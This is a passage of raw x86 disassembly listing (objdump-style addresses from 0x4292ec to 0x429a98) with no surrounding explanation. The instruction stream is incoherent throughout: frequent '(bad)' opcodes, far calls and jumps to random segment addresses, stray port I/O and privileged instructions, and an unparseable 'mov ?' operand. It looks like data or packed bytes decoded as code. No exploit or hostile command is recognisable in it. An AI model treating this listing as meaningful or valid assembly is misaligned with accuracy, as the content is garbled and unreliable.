  4292ec:	or     DWORD PTR [ebx],0x21
  4292ef:	arpl   cx,bx
  4292f1:	mov    ah,0x6a
  4292f3:	out    0x64,eax
  4292f5:	jmp    0xd4c36294
  4292fa:	mov    ebx,0x22e8a6a3
  4292ff:	lods   eax,DWORD PTR ds:[esi]
  429300:	jmp    0x6ba0c6af
  429305:	or     esi,DWORD PTR [ebx+0x7a4b79f]
  42930b:	and    esi,DWORD PTR [edx-0x631559b]
  429311:	mov    dl,0x62
  429313:	jecxz  0x42932b
  429315:	or     esi,DWORD PTR [ecx]
  429317:	xor    DWORD PTR [ebp+0x5129e87b],esp
  42931d:	and    BYTE PTR [esi+0x3b64435b],bl
  429323:	div    DWORD PTR ds:0x9dff6a64
  429329:	dec    edi
  42932a:	popf   
  42932b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42932c:	dec    ecx
  42932d:	loope  0x4292e2
  42932f:	loop   0x4292bb
  429331:	jp     0x4292dc
  429333:	ret    
  429334:	mov    dl,0x89
  429336:	xchg   BYTE PTR [ecx+ecx*8],bl
  429339:	jg     0x42936f
  42933b:	lds    esp,FWORD PTR [ecx]
  42933d:	or     al,0x63
  42933f:	cmc    
  429340:	test   DWORD PTR [ebp+0x37c2077e],eax
  429346:	int3   
  429347:	jp     0x4292fb
  429349:	daa    
  42934a:	jp     0x429363
  42934c:	jmp    0x3b0b:0xa819f638
  429353:	sbb    esi,DWORD PTR [edx+ecx*4]
  429356:	shl    DWORD PTR [ecx-0x6e7802f9],cl
  42935c:	mov    al,BYTE PTR [ebp+0x5a]
  42935f:	(bad)  
  429360:	fdiv   st,st(2)
  429362:	ror    BYTE PTR [eax+edx*4],cl
  429365:	or     edx,DWORD PTR [ebp+0x36c15f43]
  42936b:	mov    ebx,0xe27abc42
  429370:	lods   al,BYTE PTR ds:[esi]
  429371:	push   ecx
  429372:	out    0xf2,al
  429374:	jl     0x429374
  429376:	mov    eax,ds:0xe97b4c87
  42937b:	mov    DWORD PTR [ecx],esi
  42937d:	jge    0x429386
  42937f:	pop    ebp
  429380:	sub    al,0x73
  429382:	enter  0xd4a4,0xec
  429386:	scas   eax,DWORD PTR es:[edi]
  429387:	inc    edx
  429388:	stos   DWORD PTR es:[edi],eax
  429389:	jmp    0x9eed3ba0
  42938e:	call   0x3bf4:0xbe3156a3
  429395:	dec    ebx
  429396:	jno    0x429336
  429398:	or     BYTE PTR [esi],ah
  42939a:	call   0xc042:0xa224fdc
  4293a1:	mov    ebx,DWORD PTR [edx-0x3c15dcff]
  4293a7:	shld   esi,edi,0x97
  4293ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293ac:	stos   BYTE PTR es:[edi],al
  4293ad:	cs retf 0xcadb
  4293b1:	mov    esp,0xe0cd2101
  4293b6:	xchg   ecx,eax
  4293b7:	mov    edx,0x7b38973a
  4293bc:	cmp    al,0xb
  4293be:	and    DWORD PTR [edi-0x5b1ba78d],eax
  4293c4:	mov    al,ds:0xfca6081b
  4293c9:	inc    ebx
  4293ca:	push   ds
  4293cb:	inc    edi
  4293cc:	outs   dx,BYTE PTR ds:[esi]
  4293cd:	sar    DWORD PTR [esi+eax*4+0x65],0xec
  4293d2:	push   edx
  4293d3:	xchg   esp,eax
  4293d4:	or     eax,0xb2526647
  4293d9:	cmc    
  4293da:	aaa    
  4293db:	(bad)  
  4293dc:	nop
  4293dd:	xchg   ebx,eax
  4293de:	pushf  
  4293df:	jecxz  0x429393
  4293e1:	dec    ebx
  4293e2:	lock mov ds:0x1b3492ff,al
  4293e8:	mov    BYTE PTR [edx+esi*1],0xe4
  4293ec:	imul   ebp,DWORD PTR ds:0x8415f3da,0xffffffa8
  4293f3:	lock mov cl,0xbd
  4293f6:	arpl   bp,di
  4293f8:	enter  0x7ed8,0x57
  4293fc:	xor    eax,0xeca71669
  429401:	fs je  0x4293bf
  429404:	dec    ecx
  429405:	std    
  429406:	ja     0x429413
  429408:	mov    dh,0x83
  42940a:	mov    eax,0x5aae0dbf
  42940f:	(bad)  
  429410:	movq   QWORD PTR [eax],mm6
  429413:	push   ecx
  429414:	mov    ds:0x3cbb090b,eax
  429419:	clc    
  42941a:	sbb    al,0x25
  42941c:	xchg   esi,eax
  42941d:	fsub   QWORD PTR [ecx+0x78b5701]
  429423:	push   edx
  429424:	int    0x99
  429426:	aaa    
  429427:	mov    ds:0x752e0bb3,al
  42942c:	pop    ss
  42942d:	ja     0x42941f
  42942f:	add    eax,0xf57a1207
  429434:	mov    dl,0xaf
  429436:	rcl    DWORD PTR [ecx+0x55db399a],1
  42943c:	int3   
  42943d:	or     eax,edx
  42943f:	in     eax,0x92
  429441:	and    cl,BYTE PTR [edx-0x4d]
  429444:	dec    ebp
  429445:	or     eax,0xdf81c394
  42944a:	pop    edi
  42944c:	pop    ss
  42944d:	mov    ah,0xeb
  42944f:	jg     0x429493
  429451:	or     esi,DWORD PTR [edx-0x2cc6c877]
  429457:	test   eax,0xd19a7184
  42945c:	dec    ebx
  42945d:	stos   DWORD PTR es:[edi],eax
  42945e:	adc    dl,BYTE PTR [ebx+eiz*2]
  429461:	(bad)  
  429462:	and    esp,DWORD PTR [eax-0x26cae2cf]
  429468:	jmp    0x755c35b8
  42946d:	retf   0xe89a
  429470:	out    0xa9,al
  429472:	dec    esi
  429473:	in     al,dx
  429474:	frstor [eax-0x23]
  429477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429478:	out    dx,eax
  429479:	call   0x142731e6
  42947e:	hlt    
  42947f:	xchg   esp,eax
  429480:	mov    dl,0x86
  429482:	jae    0x4294ab
  429484:	pusha  
  429485:	push   edi
  429486:	ret    
  429487:	repnz dec ebx
  429489:	or     esi,DWORD PTR [edx-0x26]
  42948c:	inc    ebx
  42948d:	lods   al,BYTE PTR ds:[esi]
  42948e:	icebp  
  42948f:	push   edi
  429490:	push   esi
  429491:	cmp    al,0x9b
  429493:	sbb    bh,BYTE PTR [edi]
  429495:	and    BYTE PTR [esi+0x44],al
  429498:	cmc    
  429499:	pop    ebp
  42949a:	pop    esi
  42949b:	or     eax,0x12995733
  4294a0:	mov    dl,0x2d
  4294a2:	popa   
  4294a3:	dec    esi
  4294a4:	popf   
  4294a5:	push   ds
  4294a6:	xchg   esi,eax
  4294a7:	cmp    dh,BYTE PTR [ebx+0x2118bb9a]
  4294ad:	sbb    BYTE PTR [esi+0x42627784],0xf5
  4294b4:	pop    ds
  4294b5:	push   ss
  4294b6:	add    al,0x5c
  4294b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4294b9:	enter  0xda1e,0x63
  4294bd:	nop
  4294be:	push   0x20
  4294c0:	out    dx,al
  4294c1:	mov    ebx,DWORD PTR [ecx+eax*8+0x1d315110]
  4294c8:	pop    esp
  4294c9:	adc    eax,0x448c38ec
  4294ce:	lods   al,BYTE PTR ds:[esi]
  4294cf:	jmp    0x4294c3
  4294d1:	add    eax,0xb2e58306
  4294d6:	call   0xaae0:0xa255f3ae
  4294dd:	rol    BYTE PTR [edi+eiz*4+0x73],0x1
  4294e2:	push   eax
  4294e3:	mov    bh,BYTE PTR [ebp-0x4df4f3df]
  4294e9:	out    0xa9,al
  4294eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294ec:	jmp    0x220a484f
  4294f1:	hlt    
  4294f2:	cli    
  4294f3:	sbb    BYTE PTR [edi],ah
  4294f5:	or     ecx,DWORD PTR [eax]
  4294f7:	pop    esp
  4294f8:	xlat   BYTE PTR ds:[ebx]
  4294f9:	cld    
  4294fa:	mov    eax,0x9e12254d
  4294ff:	pop    ss
  429500:	sahf   
  429501:	cmp    BYTE PTR cs:[ecx+0x539a7437],0xa7
  429509:	xchg   ecx,eax
  42950a:	sub    ebx,edi
  42950c:	fimul  WORD PTR [ebx]
  42950e:	fcmovb st,st(0)
  429510:	inc    edi
  429511:	pop    edi
  429512:	dec    ebp
  429513:	ins    BYTE PTR es:[edi],dx
  429514:	add    al,BYTE PTR [edx-0x7c]
  429517:	lods   eax,DWORD PTR ds:[esi]
  429518:	cmp    ah,cl
  42951a:	sbb    cl,BYTE PTR [ebp-0x27]
  42951d:	dec    ecx
  42951e:	and    ebx,DWORD PTR [edx+0x6a]
  429521:	xor    bh,BYTE PTR [eax+edi*1]
  429524:	xor    bh,bh
  429526:	fild   WORD PTR [edi+0x5910c321]
  42952c:	mov    dl,0xeb
  42952e:	add    esi,esi
  429530:	mov    dh,0xcb
  429532:	mov    eax,0x450b0a11
  429537:	mov    ebp,0x14fb1650
  42953c:	into   
  42953d:	stos   DWORD PTR es:[edi],eax
  42953e:	call   0x27cb:0x4f2b2615
  429545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429546:	iret   
  429547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429548:	add    ebp,DWORD PTR [eax+0x31]
  42954b:	lahf   
  42954c:	mov    ah,0xe6
  42954e:	jge    0x4295a4
  429550:	push   ebx
  429551:	xlat   BYTE PTR ds:[ebx]
  429552:	adc    ecx,edi
  429554:	pop    eax
  429555:	push   esi
  429556:	cmp    cl,BYTE PTR [ecx]
  429558:	jle    0x4295a4
  42955a:	call   0xa376:0xc9e128d6
  429561:	push   ecx
  429562:	cld    
  429563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429564:	xchg   ebp,eax
  429565:	jne    0x429517
  429567:	sbb    al,0x2f
  42956a:	adc    DWORD PTR [ecx-0xd],0x76
  42956e:	packsswb mm0,QWORD PTR ds:0x80a49b66
  429575:	dec    eax
  429576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429577:	dec    BYTE PTR [eax]
  429579:	into   
  42957a:	dec    edx
  42957b:	jb     0x429515
  42957d:	jno    0x429554
  42957f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429580:	add    bl,BYTE PTR ds:0x8e38e528
  429586:	dec    ecx
  429587:	stc    
  429588:	mov    dl,0x7a
  42958a:	and    al,0xfe
  42958c:	and    bl,BYTE PTR [eax]
  42958e:	sti    
  42958f:	pop    ds
  429590:	aad    0xb
  429592:	cmp    BYTE PTR [eax+0x3d],al
  429595:	loope  0x429518
  429597:	jno    0x429535
  429599:	retf   
  42959a:	call   0x8844:0xa3f582a5
  4295a1:	pop    es
  4295a2:	scas   eax,DWORD PTR es:[edi]
  4295a3:	test   eax,0x75e53f1a
  4295a8:	mov    dl,0x2a
  4295aa:	sub    DWORD PTR [ebx+0x47],edx
  4295ad:	aaa    
  4295ae:	call   0x97c2:0x2b7744c
  4295b5:	mov    eax,ds:0x2cf2a7e2
  4295ba:	daa    
  4295bb:	bnd jg 0x429561
  4295be:	xor    eax,0x913eb2ea
  4295c3:	jl     0x429586
  4295c5:	mov    ebx,gs
  4295c7:	imul   edx,DWORD PTR [ebx+esi*4+0xf],0xf6bf7027
  4295cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295d0:	mov    ebp,0x50a0ef1f
  4295d5:	scas   eax,DWORD PTR es:[edi]
  4295d6:	add    bh,BYTE PTR [ebp-0x231a371b]
  4295dc:	mov    dl,0xe5
  4295de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295df:	out    dx,al
  4295e0:	mov    edi,DWORD PTR [edi+0xc3b94b0]
  4295e6:	push   cs
  4295e7:	ds out 0x23,al
  4295ea:	jecxz  0x429663
  4295ec:	fs jecxz 0x4295e5
  4295ef:	fnsave [edx-0x63b51a66]
  4295f5:	inc    esi
  4295f6:	sub    al,0xfa
  4295f8:	leave  
  4295f9:	xor    eax,0xceb269c4
  4295fe:	ror    DWORD PTR [edx],1
  429600:	pop    ebp
  429601:	mov    ecx,0xa9b3a940
  429606:	faddp  st(5),st
  429608:	out    0xbd,eax
  42960a:	cmp    dl,0x32
  42960d:	fwait
  42960e:	mov    al,ds:0x5b419a5b
  429613:	mov    al,BYTE PTR [edx]
  429615:	jg     0x4295f9
  429617:	xchg   DWORD PTR [edx-0x3209f3e4],esi
  42961d:	add    DWORD PTR [edx-0x2a],eax
  429620:	dec    eax
  429621:	or     esp,DWORD PTR [edx-0x3a]
  429624:	fst    QWORD PTR [edx]
  429626:	rol    DWORD PTR [eax-0x2a65daaf],1
  42962c:	jmp    0xec35:0x36575a44
  429633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429634:	pusha  
  429635:	arpl   WORD PTR [eax-0x7d3b7f4],cx
  42963b:	data16 mov dl,0x14
  42963e:	into   
  42963f:	adc    BYTE PTR [ebx+0x3af917a8],ah
  429645:	add    BYTE PTR [edi],al
  429647:	aad    0xb
  429649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42964a:	sbb    al,BYTE PTR [ebp-0x4ef58e83]
  429650:	mov    dl,0xf
  429652:	cwde   
  429653:	mov    bl,0x93
  429655:	inc    edx
  429656:	xor    bh,BYTE PTR [ecx+0x57b10c02]
  42965c:	lea    ecx,[edx+0x7b79e737]
  429662:	and    dh,BYTE PTR [ecx]
  429664:	and    dh,BYTE PTR [ebx-0x66]
  429667:	cmp    edx,DWORD PTR [ecx]
  429669:	or     dh,bh
  42966b:	xchg   ebx,eax
  42966c:	inc    ebp
  42966d:	push   ecx
  42966e:	cwde   
  42966f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429670:	jle    0x4296d7
  429672:	bound  esp,QWORD PTR [edi+0x4b]
  429675:	fmul   DWORD PTR [eax]
  429677:	shl    BYTE PTR [esi-0x4ad908eb],cl
  42967d:	mov    ch,0x25
  42967f:	test   eax,0x42fa0f76
  429684:	or     bl,al
  429686:	xchg   edx,eax
  429687:	jp     0x429671
  429689:	int3   
  42968a:	es (bad) 
  42968c:	mov    dl,0xaf
  42968e:	fstp   QWORD PTR [edx+0x28]
  429691:	mov    ?,WORD PTR [edx]
  429693:	out    0xb2,eax
  429695:	push   ebp
  429696:	mov    eax,ds:0xc2908efe
  42969b:	inc    eax
  42969c:	dec    ebp
  42969d:	jmp    0x429693
  42969f:	mov    ch,0xb
  4296a1:	out    dx,al
  4296a2:	fbld   TBYTE PTR [edi+0x541ac8c6]
  4296a8:	int3   
  4296a9:	(bad)  
  4296aa:	(bad)  
  4296ab:	lock fmul DWORD PTR [ebx]
  4296ae:	pop    ebp
  4296af:	jle    0x429641
  4296b1:	cmp    DWORD PTR cs:[ecx],0x3ec20bd4
  4296b8:	cmp    eax,DWORD PTR [esi-0x3bc885cb]
  4296be:	test   BYTE PTR [edx+0x10],ch
  4296c1:	sbb    BYTE PTR [edx+0x63],0x6b
  4296c5:	mov    cl,0x67
  4296c7:	(bad)  
  4296c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296c9:	xor    eax,DWORD PTR [esi+0x49]
  4296cc:	mov    cl,0x87
  4296ce:	pusha  
  4296cf:	mov    bh,0x2c
  4296d1:	mov    eax,ds:0xdd92a46a
  4296d6:	test   DWORD PTR [eax],eax
  4296d8:	cmp    BYTE PTR [ebx-0x79],dh
  4296db:	fnstenv [edx-0x66]
  4296de:	sbb    ebx,eax
  4296e0:	or     eax,0xaea744af
  4296e5:	push   edi
  4296e6:	iret   
  4296e7:	pop    edx
  4296e8:	inc    edx
  4296e9:	ss out dx,eax
  4296eb:	test   eax,0x3bc6d4cd
  4296f0:	mov    ebp,0x6874dd00
  4296f5:	or     BYTE PTR [eax-0x51f4c497],bl
  4296fb:	test   al,0x10
  4296fd:	adc    edi,DWORD PTR [ebx+0x15]
  429700:	and    BYTE PTR [edx+0x573e839b],0xec
  429707:	dec    ecx
  429708:	cmp    eax,0x26452ee
  42970d:	or     ecx,DWORD PTR [esi-0xdce5780]
  429713:	dec    edx
  429714:	jne    0x429795
  429716:	call   0xc5c8:0xced11287
  42971d:	adc    eax,0xae1ba417
  429722:	add    dh,al
  429724:	pop    esp
  429725:	pop    es
  429726:	sub    dl,dl
  429728:	es int3 
  42972a:	call   0x6bc3:0x652a0d77
  429731:	sub    BYTE PTR [ebx-0x59],ch
  429734:	out    dx,al
  429735:	jmp    0x4296ed
  429737:	(bad)  
  429738:	and    eax,0xbc958238
  42973d:	adc    eax,DWORD PTR es:[ebp+0x49]
  429741:	and    eax,0x4c6675c
  429746:	inc    DWORD PTR [ecx+0x4c]
  429749:	fwait
  42974a:	std    
  42974b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42974c:	push   cs
  42974d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42974e:	add    cl,BYTE PTR [edx-0x6]
  429751:	sbb    ch,BYTE PTR [edx+0x28]
  429754:	mov    dl,0x97
  429756:	jne    0x429733
  429758:	stc    
  429759:	enter  0xb547,0xcd
  42975d:	or     esi,eax
  42975f:	mov    ecx,0xeaab8b11
  429764:	xchg   ebx,eax
  429765:	push   0x5da35486
  42976a:	pop    ebx
  42976b:	clc    
  42976c:	jmp    0xa826:0x6ee24c3c
  429773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429774:	out    0x12,al
  429776:	jnp    0x4297da
  429778:	sub    eax,0xad35158e
  42977d:	mov    bl,0x99
  42977f:	mov    DWORD PTR [ecx+0x69],esi
  429782:	jge    0x4297b0
  429784:	mov    dl,0x6d
  429787:	rol    edx,0xcb
  42978a:	xor    ah,BYTE PTR [edi+ecx*1-0x376a5dd0]
  429791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429792:	bound  eax,QWORD PTR [edx+0x3c]
  429795:	or     BYTE PTR [edx-0x78],dh
  429798:	mov    dl,0xf1
  42979a:	das    
  42979b:	retf   
  42979c:	hlt    
  42979d:	mov    eax,ds:0xb8d2ce5
  4297a2:	call   0xbf28e35d
  4297a7:	inc    edi
  4297a8:	(bad)  
  4297a9:	push   ebp
  4297aa:	fwait
  4297ab:	ss pop ss
  4297ad:	add    ch,bh
  4297af:	jbe    0x4297df
  4297b1:	or     al,0x6a
  4297b3:	je     0x429755
  4297b5:	or     al,0x9c
  4297b7:	popf   
  4297b8:	xlat   BYTE PTR ds:[ebx]
  4297b9:	mov    ebx,0x12b01739
  4297be:	or     al,0xf9
  4297c0:	mov    dl,0x71
  4297c2:	ror    BYTE PTR [eax],0x3c
  4297c5:	addr16 loop 0x4297a6
  4297c8:	imul   ecx,DWORD PTR [ebx],0x28dce696
  4297ce:	and    edx,DWORD PTR [edx+0x46]
  4297d1:	push   0xffffff9a
  4297d3:	push   ss
  4297d4:	push   esi
  4297d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4297d6:	jno    0x42978a
  4297d8:	ins    BYTE PTR es:[edi],dx
  4297d9:	jle    0x4297db
  4297db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297dc:	cwde   
  4297dd:	pop    edx
  4297de:	(bad)  
  4297df:	sbb    bh,BYTE PTR fs:[ecx-0x1d3e7861]
  4297e6:	xchg   esp,eax
  4297e7:	in     al,0xe5
  4297e9:	ja     0x429801
  4297eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297ec:	dec    edx
  4297ed:	or     BYTE PTR [esp+ecx*2],al
  4297f0:	xchg   DWORD PTR [ebx+0x35e0fd44],esp
  4297f6:	pop    edx
  4297f7:	cmp    eax,0xc0dd2b32
  4297fc:	gs inc ebp
  4297fe:	xor    al,BYTE PTR [ecx+0x23e129b2]
  429804:	push   ss
  429805:	cmc    
  429806:	js     0x429827
  429808:	lds    ecx,FWORD PTR [ebx]
  42980a:	in     al,0x43
  42980c:	mov    al,ds:0x939aaa0a
  429811:	arpl   WORD PTR [esi+0x7e],di
  429814:	mov    bl,0x8e
  429816:	cmp    DWORD PTR [esp+eiz*4-0x55],ecx
  42981a:	jg     0x429850
  42981c:	jp     0x42987a
  42981e:	inc    ecx
  42981f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429820:	lods   al,BYTE PTR ds:[esi]
  429821:	push   ebx
  429822:	jae    0x4297b4
  429824:	xor    BYTE PTR [edi-0x51],ah
  429827:	stos   BYTE PTR es:[edi],al
  429828:	scas   eax,DWORD PTR es:[edi]
  429829:	push   ss
  42982a:	cmp    al,0x7f
  42982c:	repnz and al,0x8b
  42982f:	les    ecx,FWORD PTR [ebx]
  429831:	out    dx,eax
  429832:	push   0xffffff8f
  429834:	adc    DWORD PTR [edx+0x35],ebp
  429837:	inc    ebx
  429838:	cli    
  429839:	or     al,0x55
  42983b:	sub    bh,ch
  42983d:	mov    WORD PTR [esi-0x344411c9],ds
  429843:	imul   esi,DWORD PTR [eax-0x3f6d4995],0x6e
  42984a:	xchg   esi,eax
  42984b:	clc    
  42984c:	push   edx
  42984d:	mov    edi,0xbdb20603
  429852:	jb     0x4297dc
  429854:	out    dx,eax
  429855:	call   0xea87:0xbe50465
  42985c:	lods   al,BYTE PTR ds:[esi]
  42985d:	dec    eax
  42985e:	into   
  42985f:	and    eax,0xb09a91f8
  429864:	xlat   BYTE PTR es:[ebx]
  429866:	aad    0xc5
  429868:	xchg   BYTE PTR [ecx],bl
  42986a:	(bad)  
  42986b:	shl    DWORD PTR [ecx+0x15d5d62d],cl
  429871:	add    eax,0x2fb216c2
  429876:	push   ds
  429877:	mov    al,ds:0x309ee59e
  42987c:	popf   
  42987d:	pop    edi
  42987e:	and    esp,DWORD PTR [ebp-0x11171e8e]
  429884:	push   esi
  429885:	or     dl,BYTE PTR [ebx-0x9]
  429888:	push   edi
  429889:	js     0x429845
  42988b:	pop    edx
  42988c:	cmc    
  42988d:	out    dx,al
  42988e:	es dec edi
  429890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429891:	dec    ebx
  429892:	(bad)  
  429893:	leave  
  429894:	jle    0x4298ab
  429896:	arpl   WORD PTR [edx+esi*2-0x115cf133],bp
  42989d:	sbb    BYTE PTR [ebx],0x83
  4298a0:	ffreep st(6)
  4298a2:	or     eax,0x9bf100a7
  4298a7:	inc    edi
  4298a8:	adc    al,0xef
  4298aa:	popf   
  4298ab:	sbb    eax,0x6d531e8d
  4298b0:	add    ecx,DWORD PTR [esi+edi*4-0x36]
  4298b4:	inc    edx
  4298b5:	cmp    ch,ch
  4298b7:	xor    dl,cl
  4298b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298ba:	call   0x23c9:0xaf6ba9a0
  4298c1:	jbe    0x42991d
  4298c3:	mov    al,ds:0x379c801d
  4298c8:	stos   DWORD PTR es:[edi],eax
  4298c9:	mov    ebx,0x56a7f5a5
  4298ce:	call   0x4834:0x7d7f14a2
  4298d5:	jecxz  0x42986e
  4298d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298d8:	inc    ecx
  4298d9:	test   al,0x80
  4298db:	jae    0x429867
  4298dd:	cli    
  4298de:	cmp    ebp,DWORD PTR [esi-0x4e]
  4298e1:	loop   0x429920
  4298e3:	mov    esp,esp
  4298e5:	loopne 0x4298ce
  4298e7:	in     eax,dx
  4298e8:	add    ecx,DWORD PTR [ebx]
  4298ea:	xchg   ecx,eax
  4298eb:	jp     0x4298c5
  4298ed:	add    al,0x98
  4298f0:	xchg   esp,eax
  4298f1:	xchg   esp,eax
  4298f2:	call   0xd75:0x64237a97
  4298f9:	jg     0x4298fe
  4298fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298fc:	sub    al,0x22
  4298fe:	xchg   edi,eax
  4298ff:	pop    ss
  429900:	jg     0x4298c6
  429902:	sbb    dl,BYTE PTR [ebx+0x349559e6]
  429908:	stos   BYTE PTR es:[edi],al
  429909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42990a:	popa   
  42990b:	xchg   DWORD PTR [ebx],ebx
  42990d:	xchg   ecx,eax
  42990e:	push   0x950bf29b
  429913:	into   
  429914:	cmp    BYTE PTR [esi+0x4e],ch
  429917:	jecxz  0x429930
  429919:	and    ebx,DWORD PTR [edx-0x57dec499]
  42991f:	pop    edi
  429920:	sar    BYTE PTR [edi-0x5b],0xde
  429924:	stc    
  429925:	aaa    
  429926:	sbb    edx,eax
  429928:	xor    bl,al
  42992a:	cmp    esi,edi
  42992c:	mov    ds:0x8c310541,al
  429931:	jae    0x429901
  429933:	daa    
  429934:	sub    al,0x52
  429936:	js     0x4298cc
  429938:	sar    eax,0xbf
  42993b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42993c:	dec    edx
  42993d:	mov    ecx,0x590c063a
  429942:	mov    ecx,0x33d68eba
  429947:	xchg   esi,eax
  429948:	push   ecx
  429949:	std    
  42994a:	in     al,0xed
  42994c:	jb     0x4299bd
  42994e:	and    DWORD PTR [edi-0x8c9d071],0x1cdb8b45
  429958:	leave  
  429959:	jae    0x4298f4
  42995b:	push   ds
  42995c:	jno    0x429947
  42995e:	mov    ebp,0xc0d354e5
  429963:	mov    edx,DWORD PTR [esi-0x30e7d5bd]
  429969:	add    al,0xb4
  42996b:	gs cld 
  42996d:	rcr    BYTE PTR [edx-0x5f],1
  429970:	xadd   ch,ah
  429973:	inc    edi
  429974:	mov    dl,0x52
  429976:	mov    ds:0xad2fb751,eax
  42997b:	cld    
  42997c:	dec    ebp
  42997d:	or     eax,DWORD PTR [ecx+0x64f2bc76]
  429983:	mov    ch,0x48
  429985:	inc    ecx
  429986:	call   0xb3ae:0x5e4c729a
  42998d:	test   DWORD PTR [eax-0x5d370c77],0x71758ba7
  429997:	scas   eax,DWORD PTR es:[edi]
  429998:	(bad)  
  42999a:	mov    dh,0x47
  42999c:	or     BYTE PTR [ebp-0x66],al
  42999f:	shl    BYTE PTR [ecx+0x2dfb0b8b],1
  4299a5:	or     edx,ebp
  4299a7:	sub    DWORD PTR [edi-0x367f3fd7],ebx
  4299ad:	xor    al,0x9a
  4299af:	jns    0x429955
  4299b1:	xchg   edi,eax
  4299b2:	test   eax,0xc34e0bbd
  4299b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4299b8:	adc    BYTE PTR [ebp+0x356bd59b],0x9
  4299bf:	int    0xb1
  4299c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4299c2:	or     bh,BYTE PTR [ecx+ebx*1]
  4299c5:	jp     0x42997e
  4299c7:	pop    ss
  4299c8:	dec    esi
  4299c9:	sub    eax,0xbb557b0
  4299ce:	aas    
  4299cf:	daa    
  4299d0:	mov    bl,BYTE PTR [ecx+0x17]
  4299d3:	mov    edx,0xe59abf92
  4299d8:	shl    edx,0x11
  4299db:	lods   al,BYTE PTR ds:[esi]
  4299dc:	out    dx,al
  4299dd:	sti    
  4299de:	fldcw  WORD PTR [esi+0x3378695c]
  4299e4:	xor    ch,BYTE PTR ds:0x5e32caa2
  4299ea:	lds    esp,FWORD PTR [edi+0x1a]
  4299ed:	aaa    
  4299ee:	in     al,dx
  4299ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4299f0:	add    bh,BYTE PTR [esi+esi*2]
  4299f3:	mov    bl,0xfb
  4299f5:	mov    dl,0xa9
  4299f7:	mov    esi,0xd20d65b1
  4299fc:	pmulhuw mm5,mm1
  4299ff:	outs   dx,DWORD PTR ds:[esi]
  429a00:	ins    BYTE PTR es:[edi],dx
  429a01:	pop    es
  429a02:	mov    DWORD PTR [ebx+0x26],ecx
  429a05:	or     ebp,DWORD PTR [ebx]
  429a07:	fwait
  429a08:	dec    edi
  429a09:	pusha  
  429a0a:	xor    al,0x68
  429a0c:	xor    al,BYTE PTR [esi-0x66]
  429a0f:	mov    es,WORD PTR [eax+0x73]
  429a12:	jno    0x429a05
  429a14:	cs add ebx,ebp
  429a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a18:	(bad)  
  429a19:	arpl   WORD PTR [edx],sp
  429a1b:	jae    0x429a56
  429a1d:	cmp    DWORD PTR [ecx+eax*1-0x3532e84e],esi
  429a24:	jbe    0x4299e2
  429a26:	scas   al,BYTE PTR es:[edi]
  429a27:	outs   dx,BYTE PTR ds:[esi]
  429a28:	fwait
  429a29:	jecxz  0x429a7c
  429a2b:	adc    DWORD PTR [ecx-0x2259460f],0x4b
  429a32:	mov    gs,edx
  429a34:	test   eax,0x8cf3116b
  429a39:	xchg   esp,ebp
  429a3b:	daa    
  429a3c:	ror    BYTE PTR [ebp+0x271d2061],0x4d
  429a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429a44:	jmp    0x429a7e
  429a46:	cs xchg ebx,eax
  429a48:	adc    eax,0xb279e903
  429a4d:	jo     0x429a7b
  429a4f:	retf   
  429a50:	sub    bh,BYTE PTR [eax+0x531d9a70]
  429a56:	retf   
  429a57:	add    eax,0x9b6629b2
  429a5c:	sahf   
  429a5d:	and    DWORD PTR [ebx],0x37
  429a60:	mov    dl,0xc5
  429a62:	dec    ecx
  429a63:	pushf  
  429a64:	mov    esp,0x7a7b7f55
  429a69:	or     eax,DWORD PTR [esp+ecx*8]
  429a6c:	out    0x5c,eax
  429a6e:	add    BYTE PTR [ebx+0x2e],dh
  429a71:	neg    BYTE PTR [edx-0xfb56889]
  429a77:	shl    DWORD PTR [eax],1
  429a79:	outs   dx,DWORD PTR ds:[esi]
  429a7a:	jbe    0x429a22
  429a7c:	sub    eax,0x4deeae17
  429a81:	jecxz  0x429a21
  429a83:	jae    0x429ac5
  429a85:	aam    0x9a
  429a87:	xchg   ebp,eax
  429a88:	inc    edi
  429a89:	sti    
  429a8a:	nop
  429a8b:	xchg   ecx,eax
  429a8c:	(bad)  
  429a8d:	int3   
  429a8e:	jg     0x429a67
  429a90:	lock adc al,0x78
  429a93:	jno    0x429a52
  429a95:	retf   
  429a96:	fisubr WORD PTR [edi]
  429a98:	xchg   bh,dl
